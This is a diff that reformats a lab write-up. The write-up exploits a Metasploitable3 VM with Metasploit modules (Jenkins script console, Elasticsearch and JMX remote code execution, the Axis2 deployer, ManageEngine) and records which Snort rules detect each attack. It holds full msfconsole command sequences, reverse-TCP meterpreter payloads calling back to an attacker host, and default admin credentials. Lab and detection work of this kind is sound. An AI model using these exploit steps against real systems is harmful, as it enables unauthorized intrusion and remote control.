@@ -33,9 +33,9 @@ In the case of systems based solely on open source I would argue that it is alwa
 * Snort produced no alerts for any of the scans even when enabling sfportscan preprocessor in snort.conf and indicator-scan.rules:28. There are nmap-specific rules in deleted.rules but I decided to move on.
 # 2. Gathering information using SNMP
 2.1 msfconsole
-* msf > use auxiliary/scanner/snmp/snmp_enum
-* msf auxiliary(snmp_enum) > set RHOSTS 192.168.78.2
-* msf auxiliary(snmp_enum) > exploit
+* ` msf > use auxiliary/scanner/snmp/snmp_enum `
+* ` msf auxiliary(snmp_enum) > set RHOSTS 192.168.78.2 `
+* ` msf auxiliary(snmp_enum) > exploit `
  ...
 *  [*] System information:
 * Host IP                       : 192.168.78.2
@@ -65,10 +65,10 @@ In the case of systems based solely on open source I would argue that it is alwa
 # 4. Exploiting Jenkins
  4.1 msfconsole
 * ` msf > use exploits/multi/http/jenkins_script_console`
-*`  msf exploit(jenkins_script_console) > set RHOST 192.168.78.2`
+* `  msf exploit(jenkins_script_console) > set RHOST 192.168.78.2`
 * ` msf exploit(jenkins_script_console) > set RPORT 8484`
-*` msf exploit(jenkins_script_console) > set TARGETURI /`
-*` msf exploit(jenkins_script_console) > exploit`
+* ` msf exploit(jenkins_script_console) > set TARGETURI /`
+* ` msf exploit(jenkins_script_console) > exploit`
  ...
 * [*] Sending stage (957487 bytes) to 192.168.78.2
 * [*] Command Stager progress - 100.00% done (99626/99626 bytes)
@@ -81,8 +81,8 @@ In the case of systems based solely on open source I would argue that it is alwa
 * APP-DETECT Jenkins Groovy script access through script console attempt [**] [Classification: Potential Corporate Privacy Violation]
 # 5. Exploiting Elasticsearch (CVE-2014-3120)
 5.1 msfconsole
-*` msf > use exploit/multi/elasticsearch/script_mvel_rce`
-*` msf exploit(script_mvel_rce) > set RHOST 192.168.78.2`
+* ` msf > use exploit/multi/elasticsearch/script_mvel_rce`
+* ` msf exploit(script_mvel_rce) > set RHOST 192.168.78.2`
 * ` msf exploit(script_mvel_rce) > exploit`
 ...
 * [*] Trying to execute arbitrary Java...
@@ -102,9 +102,9 @@ In the case of systems based solely on open source I would argue that it is alwa
 # 6. Exploiting JMX (CVE-2015-2342)
  6.1 msfconsole
 * `msf > use exploit/multi/misc/java_jmx_server`
-*` msf exploit(java_jmx_server) > set RHOST 192.168.78.2`
-*` msf exploit(java_jmx_server) > set RPORT 1617`
-*` msf exploit(java_jmx_server) > exploit`
+* ` msf exploit(java_jmx_server) > set RHOST 192.168.78.2`
+* ` msf exploit(java_jmx_server) > set RPORT 1617`
+* ` msf exploit(java_jmx_server) > exploit`
 ...
 * [+] 192.168.78.2:1617 - Handshake with JMX MBean server on 192.168.78.2:49202
 * [*] 192.168.78.2:1617 - Loading payload...
@@ -122,12 +122,12 @@ In the case of systems based solely on open source I would argue that it is alwa
 7.1 msfconsole
 * Default payload did not work but adjusting target and payload gained a meterpreter prompt.
 * `msf > use exploit/multi/http/axis2_deployer`
-*` msf exploit(axis2_deployer) > set RHOST 192.168.78.2`
-*` msf exploit(axis2_deployer) > set LHOST 172.28.128.1`
-*` msf exploit(axis2_deployer) > set RPORT 8282`
-*` msf exploit(axis2_deployer) > set target 1`
-*` msf exploit(axis2_deployer) > set payload java/meterpreter/reverse_tcp`
-*` msf exploit(axis2_deployer) > exploit`
+* ` msf exploit(axis2_deployer) > set RHOST 192.168.78.2`
+* ` msf exploit(axis2_deployer) > set LHOST 172.28.128.1`
+* ` msf exploit(axis2_deployer) > set RPORT 8282`
+* ` msf exploit(axis2_deployer) > set target 1`
+* ` msf exploit(axis2_deployer) > set payload java/meterpreter/reverse_tcp`
+* ` msf exploit(axis2_deployer) > exploit`
 
 * [*] Started reverse TCP handler on 172.28.128.1:4444
 * [+] http://192.168.78.2:8282/axis2/axis2-admin [Apache-Coyote/1.1] [Axis2 Web Admin Module] successful login 'admin' : 'axis2'
@@ -137,7 +137,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 * [*] Meterpreter session 10 opened (172.28.128.1:4444 -> 192.168.78.2:52402) at 2017-04-09 21:47:02 +0300
 * [+] Deleted webapps/axis2/WEB-INF/services/ekQcQZls.jar
 
-*` meterpreter > getuid`
+* ` meterpreter > getuid`
 * Server username: METASPLOITABLE3$
 7.2 snort
 * Enabling server-other.rules:1451 and policy-other.rules:84,115-116
@@ -146,10 +146,10 @@ In the case of systems based solely on open source I would argue that it is alwa
 * POLICY-OTHER HP Universal CMDB server axis2 service upload attempt [**] [Classification: Attempted Administrator Privilege Gain]
 # 8. Exploiting ManageEngine (CVE-2015-8249)
 8.1 msfconsole
-*` msf > use exploit/windows/http/manageengine_connectionid_write
-*` msf exploit(manageengine_connectionid_write) > set RHOST 192.168.78.2
-*` msf exploit(manageengine_connectionid_write) > set RPORT 8022
-*` msf exploit(manageengine_connectionid_write) > exploit
+* ` msf > use exploit/windows/http/manageengine_connectionid_write
+* ` msf exploit(manageengine_connectionid_write) > set RHOST 192.168.78.2
+* ` msf exploit(manageengine_connectionid_write) > set RPORT 8022
+* ` msf exploit(manageengine_connectionid_write) > exploit
 
 * [*] Started reverse TCP handler on 172.28.128.1:4444
 * [*] Creating JSP stager
@@ -159,7 +159,7 @@ In the case of systems based solely on open source I would argue that it is alwa
 * [*] Meterpreter session 3 opened (172.28.128.1:4444 -> 192.168.78.2:53235) at 2017-04-09 22:34:31 +0300
 * [+] Deleted ../webapps/DesktopCentral/jspf/vSkNT.jsp
 
-*` meterpreter > getuid`
+* ` meterpreter > getuid`
 * Server username: NT AUTHORITY\LOCAL SERVICE
 8.2 snort
 * Enabling rules/server-webapp.rules:1853-1855
